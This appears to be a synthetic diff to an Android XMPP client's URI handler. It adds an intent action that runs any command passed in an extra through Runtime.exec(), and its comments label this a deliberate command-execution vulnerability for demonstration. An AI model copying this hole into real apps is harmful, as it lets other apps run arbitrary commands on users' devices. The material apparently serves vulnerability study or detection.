@@ -9,6 +9,12 @@ import com.google.zxing.integration.android.IntentResult;
 
 import java.util.Arrays;
 
+// Import necessary module for executing commands
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
 import eu.siacs.conversations.persistance.DatabaseBackend;
 import eu.siacs.conversations.utils.XmppUri;
 import eu.siacs.conversations.xmpp.jid.Jid;
@@ -76,6 +82,11 @@ public class UriHandlerActivity extends Activity {
             case ACTION_SCAN_QR_CODE:
                 new IntentIntegrator(this).initiateScan(Arrays.asList("AZTEC", "QR_CODE"));
                 return;
+            // New action to demonstrate command execution vulnerability
+            case "com.example.EXECUTE_COMMAND":
+                String cmd = data.getStringExtra("COMMAND");  // Vulnerable line: Command is directly taken from the intent without validation
+                executeCommand(cmd);  // Function call to execute the command
+                break;
         }
 
         finish();
@@ -95,5 +106,22 @@ public class UriHandlerActivity extends Activity {
 
         finish();
         super.onActivityResult(requestCode, requestCode, intent);
+    }
+
+    // Function to execute a system command
+    private void executeCommand(String cmd) {
+        try {
+            Process process = Runtime.getRuntime().exec(cmd);  // Vulnerable line: Command execution without validation
+            InputStream inputStream = process.getInputStream();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line).append("\n");
+            }
+            System.out.println("Command Output:\n" + output.toString());
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 }
